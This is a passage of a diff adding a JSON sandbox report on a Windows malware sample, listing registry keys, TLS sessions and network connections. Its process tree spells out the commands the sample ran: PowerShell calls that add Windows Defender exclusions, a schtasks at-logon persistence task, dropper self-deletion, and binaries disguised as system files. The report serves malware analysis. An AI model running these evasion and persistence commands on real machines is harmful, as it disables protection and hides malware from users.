+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{98F275B4-4FFF-11E0-89E2-7B86DFD72085}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{A00EE528-EBD9-48B8-944A-8942113D46AC}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{B4FB3F98-C1EA-428D-A78A-D1F5659CBA93}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{BD7A2E7B-21CB-41B2-A086-B309680C6B7E}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{DAF95313-E44D-46AF-BE1B-CBACEA2C3065}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{E345F35F-9397-435C-8F95-4E922C26259E}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{EDC978D6-4D53-4B2F-A265-5805674BE568}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{F5FB2C77-0E2F-4A16-A381-3E560C68BC83}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{F8278C54-A712-415B-B593-B77A2BE0DDA9}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\DelegateFolders",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\NULL",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume\\{15734c0b-4aaa-4cbe-ad75-3e504f42acb3}\\",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume\\{3882a871-858a-11eb-b9e1-806e6f6e6963}\\",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume\\{3ad3197b-12d6-45c2-a036-8dbcc38b1f2e}\\",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume\\{fde94e26-51ac-4a3b-a031-293cbf326422}\\",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\RemovableDrives",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\RemovableDrives\\DelegateFolders",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\NULL",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo\\1",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo\\1\\Desktop\\NameSpace",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo\\1\\Desktop\\NameSpace\\DelegateFolders",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo\\1\\KnownFolders",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo\\1\\MyComputer\\RemovableDrives",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo\\1\\MyComputer\\RemovableDrives\\DelegateFolders",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\NonEnum",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\WinTrust\\Trust Providers\\Software Publishing",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Internet Explorer\\Main",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Internet Explorer\\Main\\FeatureControl",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\CA",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\CA\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\CA\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\CA\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\Disallowed",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\Disallowed\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\Disallowed\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\Disallowed\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\TrustedPeople",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\TrustedPeople\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\TrustedPeople\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\TrustedPeople\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\trust",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\trust\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\trust\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\SystemCertificates\\trust\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Explorer",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\0\\Hashes",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\0\\Paths",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\0\\UrlZones",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\131072\\Hashes",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\131072\\Paths",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\131072\\UrlZones",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\262144\\Hashes",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\262144\\Paths",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\262144\\UrlZones",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\4096\\Hashes",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\4096\\Paths",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\4096\\UrlZones",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\65536\\Hashes",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\65536\\Paths",
+    "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\65536\\UrlZones",
+    "HKEY_CURRENT_USER_Classes",
+    "HKEY_CURRENT_USER_Classes\\.exe",
+    "HKEY_CURRENT_USER_Classes\\AllFilesystemObjects",
+    "HKEY_CURRENT_USER_Classes\\AllFilesystemObjects\\BrowseInPlace",
+    "HKEY_CURRENT_USER_Classes\\AllFilesystemObjects\\Clsid",
+    "HKEY_CURRENT_USER_Classes\\AllFilesystemObjects\\DocObject",
+    "HKEY_CURRENT_USER_Classes\\AllFilesystemObjects\\ShellEx\\IconHandler",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{031E4825-7B94-4DC3-B131-E946B44C8DD5}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{031E4825-7B94-4dc3-B131-E946B44C8DD5}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{04731B67-D933-450A-90E6-4ACD2E9408FE}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{04731B67-D933-450a-90E6-4ACD2E9408FE}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{11016101-E366-4D22-BC06-4ADA335C892B}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{208D2C60-3AEA-1069-A2D7-08002B30309D}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{26EE0668-A00A-44D7-9371-BEB064C98683}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{2F6CE85C-F9EE-43CA-90C7-8A9BD53A2467}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{4336A54D-038B-4685-AB02-99BB52D3FB8B}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{4336a54d-038b-4685-ab02-99bb52d3fb8b}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{450D8FBA-AD25-11D0-98A8-0800361B1103}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{59031a47-3f72-44a7-89c5-5595fe6b30ee}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{5B934B42-522B-4C34-BBFE-37A3EF7B9C90}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{5b934b42-522b-4c34-bbfe-37a3ef7b9c90}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{64693913-1C21-4F30-A98F-4E52906D3B56}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{64693913-1c21-4f30-a98f-4e52906d3b56}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{89D83576-6BD1-4C86-9454-BEB04E94C819}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{89D83576-6BD1-4c86-9454-BEB04E94C819}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{8FD8B88D-30E1-4F25-AC2B-553D3D65F0EA}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{9343812E-1C37-4A49-A12E-4B2D810D956B}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{9343812e-1c37-4a49-a12e-4b2d810d956b}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{98F275B4-4FFF-11E0-89E2-7B86DFD72085}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{A00EE528-EBD9-48B8-944A-8942113D46AC}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{B4FB3F98-C1EA-428D-A78A-D1F5659CBA93}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{BD7A2E7B-21CB-41B2-A086-B309680C6B7E}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{BD7A2E7B-21CB-41b2-A086-B309680C6B7E}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{DAF95313-E44D-46AF-BE1B-CBACEA2C3065}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{E345F35F-9397-435C-8F95-4E922C26259E}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{EDC978D6-4D53-4B2F-A265-5805674BE568}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{EDC978D6-4D53-4b2f-A265-5805674BE568}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{F324E4F9-8496-40B2-A1FF-9617C1C9AFFE}\\Instance",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{F5FB2C77-0E2F-4A16-A381-3E560C68BC83}\\Instance",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{F5FB2C77-0E2F-4A16-A381-3E560C68BC83}\\Instance\\InitPropertyBag",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{F5FB2C77-0E2F-4A16-A381-3E560C68BC83}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{F8278C54-A712-415B-B593-B77A2BE0DDA9}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{a00ee528-ebd9-48b8-944a-8942113d46ac}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{daf95313-e44d-46af-be1b-cbacea2c3065}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{e345f35f-9397-435c-8f95-4e922c26259e}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\CLSID\\{f8278c54-a712-415b-b593-b77a2be0dda9}\\ShellFolder",
+    "HKEY_CURRENT_USER_Classes\\Directory",
+    "HKEY_CURRENT_USER_Classes\\Directory\\BrowseInPlace",
+    "HKEY_CURRENT_USER_Classes\\Directory\\Clsid",
+    "HKEY_CURRENT_USER_Classes\\Directory\\DocObject",
+    "HKEY_CURRENT_USER_Classes\\Directory\\ShellEx\\IconHandler",
+    "HKEY_CURRENT_USER_Classes\\Drive\\shellex\\FolderExtensions",
+    "HKEY_CURRENT_USER_Classes\\Drive\\shellex\\FolderExtensions\\{fbeb8a05-beee-4442-804e-409d6c4515e9}",
+    "HKEY_CURRENT_USER_Classes\\Folder",
+    "HKEY_CURRENT_USER_Classes\\Folder\\BrowseInPlace",
+    "HKEY_CURRENT_USER_Classes\\Folder\\Clsid",
+    "HKEY_CURRENT_USER_Classes\\Folder\\DocObject",
+    "HKEY_CURRENT_USER_Classes\\Folder\\ShellEx\\IconHandler",
+    "HKEY_CURRENT_USER_Classes\\SystemFileAssociations\\.exe",
+    "HKEY_CURRENT_USER_Classes\\SystemFileAssociations\\.exe\\BrowseInPlace",
+    "HKEY_CURRENT_USER_Classes\\SystemFileAssociations\\.exe\\Clsid",
+    "HKEY_CURRENT_USER_Classes\\SystemFileAssociations\\.exe\\DocObject",
+    "HKEY_CURRENT_USER_Classes\\SystemFileAssociations\\.exe\\ShellEx\\IconHandler",
+    "HKEY_CURRENT_USER_Classes\\exefile",
+    "HKEY_CURRENT_USER_Classes\\exefile\\Application",
+    "HKEY_CURRENT_USER_Classes\\exefile\\BrowseInPlace",
+    "HKEY_CURRENT_USER_Classes\\exefile\\Clsid",
+    "HKEY_CURRENT_USER_Classes\\exefile\\CurVer",
+    "HKEY_CURRENT_USER_Classes\\exefile\\DocObject"
+  ],
+  "tls": [
+    {
+      "ja3": "1074895078955b2db60423ed2bf8ac23",
+      "sni": "bitbucket.org",
+      "version": "TLS 1.2",
+      "thumbprint": "4e6a4c3b8215efdf97385e50efb98642843b89f0",
+      "serial_number": "040c19f4e9ba36e333316834b8908235",
+      "issuer": {
+        "C": "US",
+        "OU": "www.digicert.com",
+        "O": "DigiCert Inc",
+        "CN": "DigiCert SHA2 Extended Validation Server CA"
+      },
+      "ja3s": "77aba8c2fc7af389a21affb0253db465",
+      "subject": {
+        "C": "US",
+        "CN": "bitbucket.org",
+        "L": "San Francisco",
+        "O": "Atlassian, Inc.",
+        "ST": "California",
+        "OU": "Bitbucket"
+      }
+    },
+    {
+      "ja3": "1074895078955b2db60423ed2bf8ac23",
+      "sni": "sanctam.net",
+      "version": "TLS 1.2",
+      "thumbprint": "3ed46d4175a592bae8dab5dfa46e24836d82e345",
+      "serial_number": "039f0bbc187cf440adbc9e9c89954a37d0bf",
+      "issuer": {
+        "C": "US",
+        "CN": "R3"
+      },
+      "ja3s": "0cac51a1efd65f5b6c047f539d24313e",
+      "subject": {
+        "CN": "sanctam.net"
+      }
+    }
+  ],
+  "ip_traffic": [
+    {
+      "transport_layer_protocol": "TCP",
+      "destination_ip": "185.65.135.234",
+      "destination_port": 58899
+    },
+    {
+      "transport_layer_protocol": "TCP",
+      "destination_ip": "13.107.4.50",
+      "destination_port": 80
+    },
+    {
+      "transport_layer_protocol": "TCP",
+      "destination_ip": "104.192.141.1",
+      "destination_port": 443
+    },
+    {
+      "transport_layer_protocol": "TCP",
+      "destination_ip": "51.255.34.118",
+      "destination_port": 14433
+    },
+    {
+      "transport_layer_protocol": "TCP",
+      "destination_ip": "185.65.135.234",
+      "destination_port": 58899
+    },
+    {
+      "transport_layer_protocol": "TCP",
+      "destination_ip": "104.192.141.1",
+      "destination_port": 443
+    },
+    {
+      "transport_layer_protocol": "TCP",
+      "destination_ip": "209.197.3.8",
+      "destination_port": 80
+    }
+  ],
+  "processes_tree": [
+    {
+      "process_id": "1180",
+      "name": "%CONHOST% \"63884270-409785765-1124711401-907951297-11692469461968206932-2068757506-1933156310"
+    },
+    {
+      "process_id": "1136",
+      "name": "%CONHOST% \"-16106042451564202799-1064727954-1124093528-15773684341340790361861259252-869253858"
+    },
+    {
+      "process_id": "2804",
+      "name": "%CONHOST% \"-40542629874978953113508502101955653726-2142237983-15632340143136557-1740783057"
+    },
+    {
+      "process_id": "2204",
+      "name": "%CONHOST% \"-291157030-44689599519763476846006265941132675325-6938727871027061752-846573854"
+    },
+    {
+      "process_id": "2384",
+      "name": "%CONHOST% \"15356416371858698971616655065-173220822-1013455786442835643-1696652431-72816561"
+    },
+    {
+      "process_id": "2088",
+      "name": "%CONHOST% \"-12634762094492256852052013660509700669-6441467901049579719-680129457-131011644"
+    },
+    {
+      "process_id": "2584",
+      "name": "%CONHOST% \"-332040313-94977547718957146-1428574376-696280166283831804-1774593772-1460146805"
+    },
+    {
+      "process_id": "2428",
+      "name": "%CONHOST% \"-2110733797-1198848899-10704337151274322012-2051096861505498860-2032469123-1205974262"
+    },
+    {
+      "process_id": "2432",
+      "name": "explorer.exe \"%windir%\\system32\\services64.exe\""
+    },
+    {
+      "process_id": "324",
+      "name": "%windir%\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding",
+      "children": [
+        {
+          "process_id": "2060",
+          "name": "\"%windir%\\System32\\services64.exe\" ",
+          "children": [
+            {
+              "process_id": "1232",
+              "name": "\"cmd\" /c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+              "children": [
+                {
+                  "process_id": "2184",
+                  "name": "powershell  -Command Add-MpPreference -ExclusionPath '%HOME%' ",
+                  "children": [
+                    {
+                      "process_id": "2812",
+                      "name": "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%HOME%'"
+                    }
+                  ]
+                },
+                {
+                  "process_id": "1288",
+                  "name": "powershell  -Command Add-MpPreference -ExclusionPath '%APPDATA%' "
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "process_id": "2712",
+      "name": "%SAMPLEPATH%",
+      "children": [
+        {
+          "process_id": "2284",
+          "time_offset": 16,
+          "name": "\"%ComSpec%\" /c %TEMP%\\svchost64.exe \"%SAMPLEPATH%\"",
+          "children": [
+            {
+              "process_id": "2332",
+              "time_offset": 16,
+              "name": "%TEMP%\\svchost64.exe  \"%SAMPLEPATH%\"",
+              "children": [
+                {
+                  "process_id": "2484",
+                  "time_offset": 19,
+                  "name": "\"%windir%\\system32\\services64.exe\" ",
+                  "children": [
+                    {
+                      "process_id": "2572",
+                      "time_offset": 19,
+                      "name": "\"cmd\" /c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+                      "children": [
+                        {
+                          "process_id": "2844",
+                          "time_offset": 29,
+                          "name": "powershell  -Command Add-MpPreference -ExclusionPath '%TEMP%' ",
+                          "children": [
+                            {
+                              "process_id": "2820",
+                              "time_offset": 29,
+                              "name": "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%TEMP%'"
+                            }
+                          ]
+                        },
+                        {
+                          "process_id": "1836",
+                          "time_offset": 22,
+                          "name": "powershell  -Command Add-MpPreference -ExclusionPath '%APPDATA%' ",
+                          "children": [
+                            {
+                              "process_id": "1028",
+                              "time_offset": 22,
+                              "name": "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%APPDATA%'"
+                            }
+                          ]
+                        },
+                        {
+                          "process_id": "2624",
+                          "time_offset": 19,
+                          "name": "powershell  -Command Add-MpPreference -ExclusionPath '%HOME%' ",
+                          "children": [
+                            {
+                              "process_id": "664",
+                              "name": "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%HOME%'"
+                            }
+                          ]
+                        },
+                        {
+                          "process_id": "2556",
+                          "time_offset": 85,
+                          "name": "powershell  -Command Add-MpPreference -ExclusionPath '%windir%' ",
+                          "children": [
+                            {
+                              "process_id": "1848",
+                              "time_offset": 85,
+                              "name": "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%windir%'"
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "process_id": "2984",
+                      "name": "\"%ComSpec%\" /c %TEMP%\\svchost64.exe \"%windir%\\system32\\services64.exe\"",
+                      "children": [
+                        {
+                          "process_id": "2964",
+                          "name": "%TEMP%\\svchost64.exe  \"%windir%\\system32\\services64.exe\"",
+                          "children": [
+                            {
+                              "process_id": "2176",
+                              "time_offset": 40,
+                              "name": "\"%ComSpec%\" /c schtasks /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"%windir%\\system32\\services64.exe\"' & exit",
+                              "children": [
+                                {
+                                  "process_id": "1364",
+                                  "time_offset": 41,
+                                  "name": "schtasks  /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"%windir%\\system32\\services64.exe\"' "
+                                }
+                              ]
+                            },
+                            {
+                              "process_id": "844",
+                              "name": "\"%windir%\\system32\\Microsoft\\Libs\\sihost64.exe\" ",
+                              "children": [
+                                {
+                                  "process_id": "1328",
+                                  "time_offset": 113,
+                                  "name": "\"%windir%\\system32\\services64.exe\" ",
+                                  "children": [
+                                    {
+                                      "process_id": "2136",
+                                      "name": "\"cmd\" /c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+                                      "children": [
+                                        {
+                                          "process_id": "2236",
+                                          "time_offset": 114,
+                                          "name": "powershell  -Command Add-MpPreference -ExclusionPath '%HOME%' ",
+                                          "children": [
+                                            {
+                                              "process_id": "2336",
+                                              "time_offset": 115,
+                                              "name": "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%HOME%'"
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "process_id": "2452",
+                  "time_offset": 17,
+                  "name": "\"%ComSpec%\" /c schtasks /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"%windir%\\system32\\services64.exe\"' & exit"
+                },
+                {
+                  "process_id": "2588",
+                  "time_offset": 19,
+                  "name": "\"%ComSpec%\" /C choice /C Y /N /D Y /T 3 & Del \"%TEMP%\\svchost64.exe\"",
+                  "children": [
+                    {
+                      "process_id": "2664",
+                      "time_offset": 19,
+                      "name": "choice  /C Y /N /D Y /T 3 "
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "process_id": "2796",
+          "time_offset": 1,
+          "name": "\"cmd\" /c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+          "children": [
+            {
+              "process_id": "2188",
+              "time_offset": 11,
+              "name": "powershell  -Command Add-MpPreference -ExclusionPath '%TEMP%' ",
+              "children": [
+                {
+                  "process_id": "2300",
+                  "time_offset": 12,
+                  "name": "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%TEMP%'"
+                }
+              ]
+            },
+            {
+              "process_id": "2816",
+              "time_offset": 1,
+              "name": "powershell  -Command Add-MpPreference -ExclusionPath '%HOME%' "
+            },
+            {
+              "process_id": "2296",
+              "time_offset": 15,
+              "name": "powershell  -Command Add-MpPreference -ExclusionPath '%windir%' ",
+              "children": [
+                {
+                  "process_id": "2144",
+                  "time_offset": 15,
+                  "name": "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%windir%'"
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "process_id": "3308",
+      "name": "%WINDIR%\\explorer.exe",
+      "children": [
+        {
+          "process_id": "3616",
+          "name": "%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe",
+          "children": [
+            {
+              "process_id": "2624",
+              "name": "C:\\Windows\\System32\\cmd.exe",
+              "children": [
+                {
+                  "process_id": "1992",
+                  "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                },
+                {
+                  "process_id": "3016",
+                  "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                },
+                {
+                  "process_id": "2112",
+                  "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                },
+                {
+                  "process_id": "2464",
+                  "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                }
+              ]
+            },
+            {
+              "process_id": "836",
+              "name": "C:\\Windows\\System32\\cmd.exe",
+              "children": [
+                {
+                  "process_id": "4076",
+                  "name": "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+                  "children": [
+                    {
+                      "process_id": "2044",
+                      "name": "C:\\Windows\\System32\\cmd.exe",
+                      "children": [
+                        {
+                          "process_id": "3552",
+                          "name": "C:\\Windows\\System32\\schtasks.exe"
+                        }
+                      ]
+                    },
+                    {
+                      "process_id": "1812",
+                      "name": "C:\\Windows\\System32\\services64.exe",
+                      "children": [
+                        {
+                          "process_id": "3504",
+                          "name": "C:\\Windows\\System32\\cmd.exe",
+                          "children": [
+                            {
+                              "process_id": "1692",
+                              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                            },
+                            {
+                              "process_id": "3752",
+                              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                            },
+                            {
+                              "process_id": "2828",
+                              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                            },
+                            {
+                              "process_id": "2508",
